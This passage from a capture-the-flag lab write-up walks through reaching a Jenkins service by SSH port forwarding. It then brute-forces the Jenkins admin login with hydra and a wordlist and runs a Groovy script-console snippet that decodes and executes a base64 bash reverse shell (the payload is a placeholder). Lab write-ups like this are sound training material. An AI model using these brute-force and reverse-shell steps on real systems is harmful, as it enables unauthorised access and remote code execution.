after gaining access as aubreanna we get the user flag and there is also
`jenkins.txt` in the home folder which says jenkins is running on port 8080

We need to set up a port forward for 8080

`ssh -L 8000:localhost:8080 aubreanna@10.10.179.97`

we can now access the jenkins page at `localhost:8000`



```
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2FecurityRealm%2Fuser%2Fadmin%2Fsearch%2Findex%3Fq%3D%2520for%2520usernames&Submit=Sign+in:Invalid username"
```

bruteforcing the login page with `admin` as the username, we get the password: `spongebob`

from within the Jenkins dashboard, we can run a reverse shell by going to the `/script` directory and running this command:

```bash
def sout \= new StringBuffer(), serr \= new StringBuffer()

def proc \= 'bash -c {echo,<BASE64 ENCODED BASH REVERSE SHELL>}|{base64,-d}|{bash,-i}'.execute()

proc.consumeProcessOutput(sout, serr)

proc.waitForOrKill(1000)

println "out> $sout err> $serr"
```

This will give us a shell for Jenkins